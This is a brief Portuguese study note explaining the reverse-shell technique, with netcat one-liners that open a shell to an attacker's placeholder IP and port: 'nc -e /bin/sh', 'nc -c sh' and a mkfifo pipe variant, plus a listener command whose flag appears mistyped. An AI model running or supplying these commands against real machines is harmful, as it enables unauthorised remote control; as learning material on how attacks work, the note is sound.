A técnica de Reverse Shell é uma maneira de possibilitar que um atacante se conecte no computador de uma vítima por meio de uma conexão remota, de forma que ele envie scripts de sua máquina principal. Bem semelhante ao ataque de Botnet. A forma de conexão é como um backdoor mas a vítima que conecta ao atacante após aberto um canal de que permita a conexão de ambas máquinas

Das variadas ferramentas, vamos citar o NetCat

### NetCat (nc)

**Listener:** deixa um canal aberto no computador do atacante que aguarda por uma conexão com a vítima;
- nc -n1 *port*

**Conectar:** feita a conexão, executa *bin/sh* para o IP remoto e a porta
- nc -e /bin/sh *IP* *port*
- nc -c sh *IP* *port*

**Outra forma sem os comandos -e, -c:** 

- rm -f /tmp/f; mkfifo /tmp/f
- cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT >/tmp/f

---
### Links Relacionados
[[NetCat]] 
https://book.hacktricks.xyz/pt/generic-hacking/reverse-shells/linux